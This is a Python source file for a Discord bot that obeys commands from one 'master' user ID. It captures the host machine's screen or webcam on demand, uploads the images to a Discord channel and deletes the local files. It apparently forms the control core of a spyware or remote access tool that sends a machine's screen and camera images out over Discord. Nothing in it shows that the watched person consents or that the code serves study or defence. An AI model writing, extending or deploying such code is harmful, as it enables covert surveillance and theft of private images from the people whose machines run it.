from .Utils import screen, fileHandler, webcam, customDiscordLib
import discord


class Bot(discord.Client):
    def __init__(self, master_id, prefix):
        self.master_id = master_id
        self.prefix = prefix
        super().__init__()

    async def on_ready(self):
        print('bot started has', self.user)

    async def on_message(self, message):
        print(f'{message.author.id} : {message.content}')
        if message.author.id != self.master_id or not message.content.startswith(self.prefix):
            return

        channel = message.channel
        text = message.content[len(self.prefix):].split(' ')
        command = text[0]
        args = text[1:]

        if command == 'screenshot':
            workingMsg = await message.channel.send("Executing...")
            fileName = screen.takeScreenshot()
            await customDiscordLib.sendFile(channel, fileName)
            fileHandler.deleteFile(fileName)

        if command == 'pic' or command == 'cam':
            workingMsg = await message.channel.send("Executing...")

            camID = 0 if not args else int(args[0])

            try:
                fileName = webcam.takePicture(camID)
                await customDiscordLib.sendFile(channel, fileName)
                fileHandler.deleteFile(fileName)
                await workingMsg.delete()

            except Exception as error:
                await workingMsg.edit(content="error : task failed :C")
                await channel.send(f'```{error}```')
